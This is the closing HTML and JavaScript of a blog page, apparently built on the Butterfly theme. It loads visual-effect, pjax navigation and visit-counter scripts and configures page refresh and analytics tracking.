<script src="/js/bubble.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
  'title',
  '#config-diff',
  '#body-wrap',
  '#rightside-config-hide',
  '#rightside-config-show',
  '.js-pjax'
]

if (false) {
  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
}

var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.removeEventListener('scroll', window.tocScrollFn)
  window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // Analytics
  if (false) {
    MtaH5.pgv()
  }

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>